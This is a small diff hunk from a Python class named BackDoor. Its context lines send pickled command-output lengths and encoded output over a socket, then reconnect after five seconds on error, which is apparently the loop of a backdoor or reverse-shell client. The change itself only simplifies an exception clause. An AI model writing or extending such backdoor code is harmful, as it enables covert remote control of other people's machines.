@@ -25,7 +25,7 @@ class BackDoor:
                     s.send(pickle.dumps(output_length))
                     run = run.encode(encoding="latin1")
                     s.send(run)
-            except  Exception  as e:
+            except Exception:
                 s.close()
                 sleep(5)
 def get_arguments():
